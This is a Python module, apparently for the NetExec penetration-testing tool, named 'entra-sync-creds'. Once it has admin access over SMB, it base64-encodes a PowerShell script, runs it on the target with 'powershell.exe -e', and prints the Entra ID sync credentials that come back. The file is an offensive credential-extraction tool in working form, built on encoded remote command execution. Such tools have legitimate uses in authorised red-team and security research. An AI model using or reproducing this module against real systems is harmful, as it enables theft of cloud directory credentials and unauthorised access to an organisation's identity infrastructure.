
from base64 import b64encode
from nxc.helpers.powershell import get_ps_script


class NXCModule:
    """
    Example:
    -------
    Module by @NeffIsBack
    """

    name = "entra-sync-creds"
    description = "Extract Entra ID sync credentials from the target host"
    supported_protocols = ["smb"]
    opsec_safe = True

    def __init__(self):
        self.context = None
        self.module_options = None

        self.entra_id_psscript = ""

        with open(get_ps_script("entra-sync-creds/entra-sync-creds.ps1")) as psFile:
            for line in psFile:
                if line.startswith("#") or line.strip() == "":
                    continue
                else:
                    self.entra_id_psscript += line.strip() + "\n"

    def options(self, context, module_options):
        """No module options available."""

    def on_admin_login(self, context, connection):
        self.context = context

        psScript_b64 = b64encode(self.entra_id_psscript.encode("UTF-16LE")).decode("utf-8")
        out = connection.execute(f"powershell.exe -e {psScript_b64} -OutputFormat Text", True)

        if "CLIXML" in out:
            out = out.split("CLIXML")[1].split("<Objs Version")[0]

        for line in out.splitlines():
            if not line.strip():
                continue
            if "[!]" in line:
                self.context.log.fail(line.replace("[!]", "").strip())
            else:
                self.context.log.highlight(line.strip())
